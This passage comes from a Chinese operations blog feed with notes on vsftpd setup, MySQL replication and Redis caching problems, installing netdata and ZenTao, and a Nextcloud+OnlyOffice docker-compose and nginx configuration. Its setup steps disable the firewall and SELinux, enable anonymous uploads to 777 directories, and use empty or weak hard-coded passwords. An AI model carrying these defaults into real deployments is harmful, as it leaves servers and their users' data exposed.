      <url>2020/12/04/%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1_vsftpd/</url>
      
        <content type="html"><![CDATA[<h1 id="vsftpd"><a href="#vsftpd" class="headerlink" title="vsftpd"></a>vsftpd</h1><p>环境：</p><ul><li>服务端：centos7 1台</li><li>客户端：windows、linux均可</li><li>关闭selinux、firewalld<h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">全称：very security ftp</span><br><span class="line">FTP（File Transfer Protocol，文件传输协议）：用来在不同类型的计算机之间传输文件的协议。属于TCP&#x2F;IP协议簇，工作在OSI模型的第七层及TCP&#x2F;IP模型的第四层，是一种面向连接的协议。</span><br><span class="line">FTP服务器：在网络中提供存储文件空间的计算机，应用FTP协议提供服务。用户可以连接到服务器上下载文件，也可以将文件上传到FTP服务器中。</span><br><span class="line">FTP在对外提供服务时需要维护两个连接：一个是控制连接，负责监听21端口，用来传输控制命令；另一个是数据连接，在主动传输方式下监听20端口，用来传输数据。</span><br><span class="line">FTP协议有两种工作模式，</span><br><span class="line">      主动模式（也就是PORT模式）：主动模式FTP的客户端发送PORT命令到FTP服务器；</span><br><span class="line">      被动模式（也就是PSAV）：被动模式FTP的客户端发送PSAV命令到FTP服务器。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">协议：ftp 文件传输协议</span><br><span class="line">端口：</span><br><span class="line">  建立tcp连接： 21</span><br><span class="line">  传输数据：20</span><br><span class="line">  1024+的随即端口</span><br><span class="line">客户端软件：</span><br><span class="line">  浏览器</span><br><span class="line">  资源管理器</span><br><span class="line">  ftp</span><br><span class="line">  lftp(推荐)</span><br><span class="line"> 安装软件</span><br><span class="line">客户端</span><br><span class="line">  lftp-4.0.9-1.el6.x86_64</span><br><span class="line">  ftp-0.17-53.el6.x86_64</span><br><span class="line">服务端</span><br><span class="line">  vsftpd-2.2.2-11.el6.x86_64</span><br></pre></td></tr></table></figure><h3 id="二、服务端配置"><a href="#二、服务端配置" class="headerlink" title="二、服务端配置"></a>二、服务端配置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@ftpserver ~]# systemctl stop firewalld &amp;&amp; setenforce 0</span><br><span class="line">[root@ftpserver ~]# yum install -y vsftpd  # 下载vsftpd的包</span><br><span class="line">[root@ftpserver ~]# vim &#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf # 修改配置文件,修改一下配置</span><br><span class="line">anonymous_enable&#x3D;NO         # 不允许匿名登录</span><br><span class="line">anon_upload_enable&#x3D;YES      # 允许上传文件</span><br><span class="line">anon_mkdir_write_enable&#x3D;YES # 允许上传目录</span><br><span class="line">注：修改后服务需要重启，客户端退出重新登录，ftp根目录不能高于755权限，pub和自创目录需要777权限才能上传成功。</span><br><span class="line">[root@ftpserver ~]# passwd ftp  # 修改ftp账号密码</span><br><span class="line">[root@ftpserver ~]# systemctl start vsftpd  # 启动ftp服务器</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="三、客户端配置"><a href="#三、客户端配置" class="headerlink" title="三、客户端配置"></a>三、客户端配置</h3><p>1、windows客户端<br>使用资源管理器或者浏览器<br>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-xmgEQ1HF-1577028169486)(<a href="https://note.youdao.com/yws/res/6124/DDD30495B39443E8A6330792254A8943)]">https://note.youdao.com/yws/res/6124/DDD30495B39443E8A6330792254A8943)]</a></p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-oGTopoOa-1577028169487)(<a href="https://note.youdao.com/yws/res/6126/ED1FDF16A9044141B0920B03FEDA8039)]">https://note.youdao.com/yws/res/6126/ED1FDF16A9044141B0920B03FEDA8039)]</a></p><p>2、linux 客户端</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# lftp 192.168.101.244 -u ftp</span><br><span class="line">口令: </span><br><span class="line">lftp ftp@192.168.101.244:~&gt; ls            </span><br><span class="line">drwxr-xr-x    2 0        0               6 Jul 03 12:17 777</span><br><span class="line">drwxr-xr-x    2 0        0               6 Oct 30  2018 pub</span><br><span class="line">drwxrwxrwx    2 0        0              67 Jul 03 12:19 testput</span><br><span class="line">lftp ftp@192.168.101.244:~&gt; </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    #lftp  172.16.70.251  </span><br><span class="line">    #lftp  172.16.70.251 -u wing  -p  端口</span><br><span class="line">    &gt; help</span><br><span class="line">    &gt; help ls</span><br><span class="line">    &gt; ls       &#x2F;&#x2F;查看文件</span><br><span class="line">    &gt; dir      &#x2F;&#x2F;同上</span><br><span class="line">    &gt; cd  pub</span><br><span class="line">    &gt; lcd  &#x2F;root&#x2F;Desktop    &#x2F;&#x2F;切换本地目录</span><br><span class="line">    &gt; get  文件1 文件2 文件3    -o   &#x2F;root&#x2F;Desktop        &#x2F;&#x2F;下载文件,多个文件用空格隔开，-o指定下载目录</span><br><span class="line">    &gt; mirror  目录  指定的下载目录           &#x2F;&#x2F;下载目录</span><br><span class="line">    &gt; put      文件                &#x2F;&#x2F;上传文件</span><br><span class="line">    &gt; mirror  -R  目录       &#x2F;&#x2F;上传目录</span><br><span class="line">    &gt; mkdir  目录</span><br><span class="line">    &gt; rmdir  目录</span><br><span class="line">    &gt; mget -c  aaa.txt </span><br><span class="line">vsftpd扩展功能</span><br><span class="line">常用全局配置</span><br><span class="line">    listen_address&#x3D;192.168.4.1   &#x2F;&#x2F;设置监听的IP 地址</span><br><span class="line">    listen_port&#x3D;21                       &#x2F;&#x2F;设置监听FTP 服务的端口号</span><br><span class="line">    write_enable&#x3D;YES                  &#x2F;&#x2F;是否启用写入权限</span><br><span class="line">    download_enable&#x3D;YES           &#x2F;&#x2F;是否允许下载文件</span><br><span class="line">    </span><br><span class="line">    userlist_enable&#x3D;YES              &#x2F;&#x2F;是否启用user_list 列表文件</span><br><span class="line">    download_enable&#x3D;NO &#x2F;&#x2F;禁止用户下载</span><br><span class="line">    anon_other_write_enable&#x3D;YES &#x2F;&#x2F;匿名用户可以删除和重命名                                                 &#x2F;&#x2F;文件在&#x2F;etc&#x2F;vsftpd目录下</span><br><span class="line">    userlist_deny&#x3D;YES                 &#x2F;&#x2F;是否禁用user_list 中的用户</span><br><span class="line"></span><br><span class="line">    max_clients&#x3D;0                       &#x2F;&#x2F;限制并发客户端连接数</span><br><span class="line">    max_per_ip&#x3D;0                        &#x2F;&#x2F;限制同一IP 地址的并发连接数</span><br><span class="line">    </span><br><span class="line">常用的匿名FTP 配置项</span><br><span class="line">    anonymous_enable&#x3D;YES      &#x2F;&#x2F;启用匿名访问</span><br><span class="line">    anon_umask&#x3D;022                &#x2F;&#x2F;匿名用户所上传文件的权限掩码</span><br><span class="line">    anon_root&#x3D;&#x2F;var&#x2F;ftp               &#x2F;&#x2F;匿名用户根目录</span><br><span class="line">    anon_upload_enable&#x3D;YES    &#x2F;&#x2F;允许上传文件</span><br><span class="line">    anon_mkdir_write_enable&#x3D;YES     &#x2F;&#x2F;允许创建目录</span><br><span class="line">    anon_other_write_enable&#x3D;YES      &#x2F;&#x2F;开放其他写入权</span><br><span class="line">    anon_max_rate&#x3D;0                        &#x2F;&#x2F;限制最大传输速率,单位为字节</span><br><span class="line"></span><br><span class="line">常用的本地用户FTP 配置项</span><br><span class="line">    local_enable&#x3D;YES                         &#x2F;&#x2F;是否启用本地系统用户</span><br><span class="line">    local_umask&#x3D;022                         &#x2F;&#x2F;本地用户所上传文件的权限掩码</span><br><span class="line">    local_root&#x3D;&#x2F;var&#x2F;ftp                        &#x2F;&#x2F;本地账户ftp根目录</span><br><span class="line">    local_max_rate&#x3D;0                          &#x2F;&#x2F;限制最大传输速率(字节&#x2F;秒)</span><br><span class="line"></span><br><span class="line">    chroot_local_user&#x3D;YES                 &#x2F;&#x2F;限制所有本地用户在家目录里</span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库同步原理及常见问题解决方案-运维实记</title>
      <link href="2020/12/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8C%E6%AD%A5%E5%8E%9F%E7%90%86%E5%8F%8A%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88-%E8%BF%90%E7%BB%B4%E5%AE%9E%E8%AE%B0/"/>
      <url>2020/12/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8C%E6%AD%A5%E5%8E%9F%E7%90%86%E5%8F%8A%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88-%E8%BF%90%E7%BB%B4%E5%AE%9E%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql问题"><a href="#mysql问题" class="headerlink" title="mysql问题"></a>mysql问题</h1><h5 id="mysql-主从同步原理"><a href="#mysql-主从同步原理" class="headerlink" title="mysql 主从同步原理"></a>mysql 主从同步原理</h5><p><img src="https://img-blog.csdnimg.cn/20191224095930592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">同步过程：</span><br><span class="line">1.在备库B上通过change master命令，设置主库A的IP、端口、用户名、密码，以及要从哪个位置开始请求binlog，这个位置包含文件名和日志偏移量</span><br><span class="line">2.在备库B上执行start slave命令，这时备库会启动两个线程，就是图中的io_thread和sql_thread。其中io_thread负责与主库建立连接</span><br><span class="line">3.主库A校验完用户名、密码后，开始按照备库B传过来的位置，从本地读取binlog，发给B</span><br><span class="line">4.备库B拿到binlog后，写到本地文件，称为中转日志</span><br><span class="line">5.sql_thread读取中转日志，解析出日志里的命令，并执行</span><br><span class="line">日志：</span><br><span class="line">undo_log:回滚日志</span><br><span class="line">redo_log:重做日志</span><br><span class="line">binlog: 二进制日志</span><br><span class="line">relay_log:中继日志</span><br></pre></td></tr></table></figure><p><a href="%E5%8F%82%E8%80%83%EF%BC%9Ahttps://blog.csdn.net/qq_17612199/article/details/80284080">日志作用参考</a></p><h5 id="主备延迟、主从延迟"><a href="#主备延迟、主从延迟" class="headerlink" title="主备延迟、主从延迟"></a>主备延迟、主从延迟</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据同步延迟情况参考: show slave status;  --&gt; seconds_behind_master , 此参数表示同步延迟时间为多少秒</span><br><span class="line">延迟时间点：</span><br><span class="line">1.主库A执行完成一个事务，写入binlog，时间点time1</span><br><span class="line">2.之后传给备库B，备库B接收完这个binlog,时间点time2</span><br><span class="line">3.备库B执行完这个事务，时间点 time3</span><br><span class="line">time3 减去 time1 的时间差为同步延迟时间，主要是在执行一个事务中备库与主库执行执行完的时间偏差</span><br><span class="line">seconds_behind_master 计算方式：</span><br><span class="line">1.每个事务的binlog里面都有一个时间字段，用于记录主库上写入的时间</span><br><span class="line">2.备库取出当前正在执行的事务的时间字段的值，计算它与当前系统时间的差值，得到seconds_behind_master</span><br><span class="line">如果主备库机器的系统时间设置不一致，不会导致主备延迟的值不准。备库连接到主库的时候，会通过SELECTUNIX_TIMESTAMP()函数来获得当前主库的系统时间。如果这时候发现主库的系统时间与自己不一致，备库在执行seconds_behind_master计算的时候会自动扣掉这个差值，网络正常情况下，主备延迟的主要来源是备库接收完binlog和执行完这个事务之间的时间差，主备延迟最直接的表现是，备库消费中转日志的速度，比主库生产binlog的速度要慢。</span><br></pre></td></tr></table></figure><h5 id="主备、主从延迟原因"><a href="#主备、主从延迟原因" class="headerlink" title="主备、主从延迟原因"></a>主备、主从延迟原因</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、从库配置较主库偏低</span><br><span class="line">2、主库提供写操作，备库和从库提供读操作，读操作频繁，导致备库或从库压力大。</span><br><span class="line">3、执行事务较大，一般是执行比较大的DDl语句。</span><br><span class="line">解决方案：</span><br><span class="line">1、提升从库数量或从库配置</span><br><span class="line">2、sql语句的优化</span><br></pre></td></tr></table></figure><h5 id="主备切换"><a href="#主备切换" class="headerlink" title="主备切换"></a>主备切换</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">双M结构下，从状态1到状态2切换的详细过程如下：</span><br><span class="line">1.判断备库B现在的seconds_behind_master，如果小于某个值继续下一步，否则持续重试这一步</span><br><span class="line">2.把主库A改成只读状态，即把readonly设置为true</span><br><span class="line">3.判断备库B的seconds_behind_master的值，直到这个值变成0为止</span><br><span class="line">4.把备库B改成可读写状态，也就是把readonly设置为false</span><br><span class="line">5.把业务请求切到备库B</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="redis-问题"><a href="#redis-问题" class="headerlink" title="redis 问题"></a>redis 问题</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">什么是缓存穿透？如何避免？什么是缓存雪崩？何如避免？</span><br><span class="line">缓存穿透</span><br><span class="line">一般的缓存系统，都是按照key去缓存查询，如果不存在对应的value，就应该去后端系统查找（比如DB）。一些恶意的请求会故意查询不存在的key,请求量很大，就会对后端系统造成很大的压力。这就叫做缓存穿透。</span><br><span class="line">如何避免？</span><br><span class="line">1：对查询结果为空的情况也进行缓存，缓存时间设置短一点，或者该key对应的数据insert了之后清理缓存。</span><br><span class="line">2：对一定不存在的key进行过滤。可以把所有的可能存在的key放到一个大的Bitmap中，查询时通过该bitmap过滤。</span><br><span class="line">缓存雪崩</span><br><span class="line">当缓存服务器重启或者大量缓存集中在某一个时间段失效，这样在失效的时候，会给后端系统带来很大压力。导致系统崩溃。</span><br><span class="line">如何避免？</span><br><span class="line">1：在缓存失效后，通过加锁或者队列来控制读数据库写缓存的线程数量。比如对某个key只允许一个线程查询数据和写缓存，其他线程等待。</span><br><span class="line">2：做二级缓存，A1为原始缓存，A2为拷贝缓存，A1失效时，可以访问A2，A1缓存失效时间设置为短期，A2设置为长期</span><br><span class="line">3：不同的key，设置不同的过期时间，让缓存失效的时间点尽量均匀。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决方案-netstat-禅道-NEXTCLOUD+ONLYOFFICE</title>
      <link href="2020/12/04/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88-netstat-%E7%A6%85%E9%81%93-NEXTCLOUD+ONLYOFFICE/"/>
      <url>2020/12/04/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88-netstat-%E7%A6%85%E9%81%93-NEXTCLOUD+ONLYOFFICE/</url>
      
        <content type="html"><![CDATA[<h1 id="netdata"><a href="#netdata" class="headerlink" title="netdata"></a>netdata</h1><ul><li><p>单机监控之最</p></li><li><p>安装依赖</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y autoconf automake curl gcc git libmnl-devel libuuid-devel lm_sensors make MySQL-python nc pkgconfig python python-psycopg2 PyYAML zlib-devel libuv libuv-devel   (需要epel源)</span><br><span class="line"></span><br><span class="line">下载git  git项目</span><br><span class="line">git clone https://github.com/netdata/netdata.git --depth=100</span><br><span class="line">cd netdata</span><br><span class="line">./netdata-install.sh</span><br></pre></td></tr></table></figure><h1 id="禅道"><a href="#禅道" class="headerlink" title="禅道"></a>禅道</h1><ul><li>开源BUG提交系统</li></ul><h3 id="1-开源版安装包下载"><a href="#1-开源版安装包下载" class="headerlink" title="1.开源版安装包下载"></a>1.开源版安装包下载</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cd /opt</span><br><span class="line">[root@localhost opt]# wget http://dl.cnezsoft.com/zentao/9.0.1/ZenTaoPMS.9.0.1.zbox_64.tar.gz</span><br></pre></td></tr></table></figure><h3 id="2-解压"><a href="#2-解压" class="headerlink" title="2.解压"></a>2.解压</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost opt]# tar -zxvf ZenTaoPMS.9.0.1.zbox_64.tar.gz -C /opt</span><br></pre></td></tr></table></figure><h3 id="3-修改端口号"><a href="#3-修改端口号" class="headerlink" title="3.修改端口号"></a>3.修改端口号</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">修改禅道自带apache端口：</span><br><span class="line">[root@localhost opt]# /opt/zbox/zbox -ap 9000</span><br><span class="line">修改禅道自带mysql端口：</span><br><span class="line">[root@localhost opt]# /opt/zbox/zbox -mp 9001</span><br></pre></td></tr></table></figure><h3 id="4-禅道运行命令"><a href="#4-禅道运行命令" class="headerlink" title="4.禅道运行命令"></a>4.禅道运行命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost opt]# /opt/zbox/zbox start   #命令开启Apache和Mysql</span><br><span class="line">[root@localhost opt]# /opt/zbox/zbox stop    #命令停止Apache和Mysql</span><br><span class="line">[root@localhost opt]# /opt/zbox/zbox restart #命令重启Apache和Mysql</span><br><span class="line">[root@localhost opt]# /opt/zbox/zbox  -h     #命令来获取关于zbox命令的帮助</span><br></pre></td></tr></table></figure><h3 id="5-初始化配置"><a href="#5-初始化配置" class="headerlink" title="5.初始化配置"></a>5.初始化配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">创建数据库账号</span><br><span class="line">[root@localhost opt]# /opt/zbox/auth/adduser.sh  </span><br><span class="line">This tool is used to add user to access admin</span><br><span class="line">Account: admin</span><br><span class="line">Password: Adding password for user admin</span><br><span class="line">注：mysql数据库的用户名：root，密码为空。应用的数据库管理用的是admin，但是为了安全，访问admin的时候需要身份验证，需要运行脚本添加账户</span><br><span class="line"></span><br><span class="line">命令行登录禅道自带mysql数据库：</span><br><span class="line">[root@localhost opt]# /opt/zbox/bin/mysql -u root -P 3306 -p   # 注意端口号不用改为9001</span><br><span class="line">命令行导入备份的数据：</span><br><span class="line">[root@localhost opt]# /opt/zbox/bin/mysql -u root -P 3306 -p zentaopro &lt; zentao.sql</span><br><span class="line">如果是首次安装“禅道”，此处略过；如果之前已经装有“禅道”，想导入之前的数据，则可以导入备份的zentao.sql文件</span><br></pre></td></tr></table></figure><h3 id="6-配置iptables防火墙规则，允许端口访问"><a href="#6-配置iptables防火墙规则，允许端口访问" class="headerlink" title="6.配置iptables防火墙规则，允许端口访问"></a>6.配置iptables防火墙规则，允许端口访问</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost opt]# /sbin/iptables -I INPUT -p tcp --dport 9000 -j ACCEPT</span><br><span class="line">[root@localhost opt]# /sbin/iptables -I INPUT -p tcp --dport 9001 -j ACCEPT</span><br></pre></td></tr></table></figure><h1 id="NEXTCLOUD-ONLYOFFICE"><a href="#NEXTCLOUD-ONLYOFFICE" class="headerlink" title="NEXTCLOUD+ONLYOFFICE"></a>NEXTCLOUD+ONLYOFFICE</h1><ul><li>云服务解决及在线办公系统</li></ul><h3 id="一、docker-服务清理及安装"><a href="#一、docker-服务清理及安装" class="headerlink" title="一、docker 服务清理及安装"></a>一、docker 服务清理及安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">关闭防火墙，selinux</span><br><span class="line"></span><br><span class="line">yum remove docker \</span><br><span class="line">docker-client \</span><br><span class="line">docker-client-latest \</span><br><span class="line">docker-common \</span><br><span class="line">docker-latest \</span><br><span class="line">docker-latest-logrotate \</span><br><span class="line">docker-logrotate \</span><br><span class="line">docker-selinux \</span><br><span class="line">docker-engine-selinux \</span><br><span class="line">docker-engine</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">安装docker所需要的依赖环境</span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line">#3.安装docker仓库</span><br><span class="line">yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo</span><br><span class="line">#4.安装docker</span><br><span class="line">yum install docker-ce -y</span><br><span class="line">#5.启动docker</span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二、docker-file"><a href="#二、docker-file" class="headerlink" title="二、docker file"></a>二、docker file</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">下方文件中：</span><br><span class="line">      MYSQL_ROOT_PASSWORD: 123456</span><br><span class="line">      MYSQL_DATABASE: nextcloud</span><br><span class="line">      MYSQL_USER: nextcloud</span><br><span class="line">      MYSQL_PASSWORD: nextcloud123</span><br><span class="line">      ports</span><br><span class="line">均可修改</span><br></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    hostname: web</span><br><span class="line">    image: nginx</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="number">80</span>:<span class="number">80</span></span><br><span class="line">    networks:</span><br><span class="line">      - cloud_net</span><br><span class="line">    restart: always</span><br><span class="line">    volumes:</span><br><span class="line">      - ./nextcloud:/var/www/html</span><br><span class="line">      - ./nginx.conf:/etc/nginx/nginx.conf:ro</span><br><span class="line">    depends_on:</span><br><span class="line">      - app</span><br><span class="line"></span><br><span class="line">  app:</span><br><span class="line">    hostname: app</span><br><span class="line">    image: nextcloud:<span class="number">18.0</span>.<span class="number">3</span>-fpm-alpine</span><br><span class="line">    restart: always</span><br><span class="line">    networks:</span><br><span class="line">      - cloud_net</span><br><span class="line">    volumes:</span><br><span class="line">      - ./nextcloud:/var/www/html</span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    hostname: db</span><br><span class="line">    image: mariadb</span><br><span class="line">    restart: always</span><br><span class="line">    networks:</span><br><span class="line">      - cloud_net</span><br><span class="line">    volumes:</span><br><span class="line">      - ./db/data:/var/lib/mysql</span><br><span class="line">    command: --character-set-server=utf8</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_ROOT_PASSWORD: <span class="number">123456</span></span><br><span class="line">      MYSQL_DATABASE: nextcloud</span><br><span class="line">      MYSQL_USER: nextcloud</span><br><span class="line">      MYSQL_PASSWORD: nextcloud123</span><br><span class="line"></span><br><span class="line">  onlyoffice:</span><br><span class="line">    hostname: onlyoffice</span><br><span class="line">    image: onlyoffice/documentserver</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="number">6060</span>:<span class="number">80</span></span><br><span class="line">    networks:</span><br><span class="line">      - cloud_net</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">  cloud_net:</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="三、nginx-file"><a href="#三、nginx-file" class="headerlink" title="三、nginx file"></a>三、nginx file</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">user</span>  www-data;</span><br><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">error_log</span>  /var/log/nginx/error.log <span class="literal">warn</span>;</span><br><span class="line"><span class="attribute">pid</span>        /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       /etc/nginx/mime.types;</span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">log_format</span>  main  <span class="string">&#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span></span><br><span class="line">                      <span class="string">&#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span></span><br><span class="line">                      <span class="string">&#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">access_log</span>  /var/log/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">set_real_ip_from</span>  <span class="number">10.0.0.0</span>/<span class="number">8</span>;</span><br><span class="line">    <span class="attribute">set_real_ip_from</span>  <span class="number">172.16.0.0</span>/<span class="number">12</span>;</span><br><span class="line">    <span class="attribute">set_real_ip_from</span>  <span class="number">192.168.0.0</span>/<span class="number">16</span>;</span><br><span class="line">    <span class="attribute">real_ip_header</span>    X-Real-IP;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gzip  on;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">upstream</span> php-handler &#123;</span><br><span class="line">        <span class="attribute">server</span> app:<span class="number">9000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">add_header</span> X-Content-Type-Options nosniff;</span><br><span class="line">        <span class="attribute">add_header</span> X-XSS-Protection <span class="string">&quot;1; mode=block&quot;</span>;</span><br><span class="line">        <span class="attribute">add_header</span> X-Robots-Tag <span class="literal">none</span>;</span><br><span class="line">        <span class="attribute">add_header</span> X-Download-Options noopen;</span><br><span class="line">        <span class="attribute">add_header</span> X-Permitted-Cross-Domain-Policies <span class="literal">none</span>;</span><br><span class="line">        <span class="attribute">add_header</span> Referrer-Policy <span class="literal">no</span>-referrer;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">root</span> /var/www/html;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> = /robots.txt &#123;</span><br><span class="line">            <span class="attribute">allow</span> all;</span><br><span class="line">            <span class="attribute">log_not_found</span> <span class="literal">off</span>;</span><br><span class="line">            <span class="attribute">access_log</span> <span class="literal">off</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> = /.well-known/carddav &#123;</span><br><span class="line">            <span class="attribute">return</span> <span class="number">301</span> $scheme://$host/remote.php/dav;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="attribute">location</span> = /.well-known/caldav &#123;</span><br><span class="line">            <span class="attribute">return</span> <span class="number">301</span> $scheme://$host/remote.php/dav;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># set max upload size</span></span><br><span class="line">        <span class="attribute">client_max_body_size</span> <span class="number">10G</span>;</span><br><span class="line">        <span class="attribute">fastcgi_buffers</span> <span class="number">64</span> <span class="number">4K</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Enable gzip but do not remove ETag headers</span></span><br><span class="line">        <span class="attribute">gzip</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">gzip_vary</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">gzip_comp_level</span> <span class="number">4</span>;</span><br><span class="line">        <span class="attribute">gzip_min_length</span> <span class="number">256</span>;</span><br><span class="line">        <span class="attribute">gzip_proxied</span> expired <span class="literal">no</span>-cache <span class="literal">no</span>-store private no_last_modified no_etag auth;</span><br><span class="line">        <span class="attribute">gzip_types</span> application/atom+xml application/javascript application/json application/ld+json application/manifest+json application/rss+xml application/vnd.geo+json application/vnd.ms-fontobject application/x-font-ttf application/x-web-app-manifest+json application/xhtml+xml application/xml font/opentype image/bmp image/svg+xml image/x-icon text/cache-manifest text/css text/plain text/vcard text/vnd.rim.location.xloc text/vtt text/x-component text/x-cross-domain-policy;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> / &#123;</span><br><span class="line">            <span class="attribute">rewrite</span><span class="regexp"> ^</span> /index.php$request_uri;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ ^/(?:build|tests|config|lib|3rdparty|templates|data)/</span> &#123;</span><br><span class="line">            <span class="attribute">deny</span> all;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ ^/(?:\.|autotest|occ|issue|indie|db_|console)</span> &#123;</span><br><span class="line">            <span class="attribute">deny</span> all;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ ^/(?:index|remote|public|cron|core/ajax/update|status|ocs/v[12]|updater/.+|ocs-provider/.+)\.php(?:$|/)</span> &#123;</span><br><span class="line">            <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.*)$</span>;</span><br><span class="line">            <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">            <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">            <span class="attribute">fastcgi_param</span> PATH_INFO $fastcgi_path_info;</span><br><span class="line">            <span class="comment"># fastcgi_param HTTPS on;</span></span><br><span class="line">            <span class="comment">#Avoid sending the security headers twice</span></span><br><span class="line">            <span class="attribute">fastcgi_param</span> modHeadersAvailable <span class="literal">true</span>;</span><br><span class="line">            <span class="attribute">fastcgi_param</span> front_controller_active <span class="literal">true</span>;</span><br><span class="line">            <span class="attribute">fastcgi_pass</span> php-handler;</span><br><span class="line">            <span 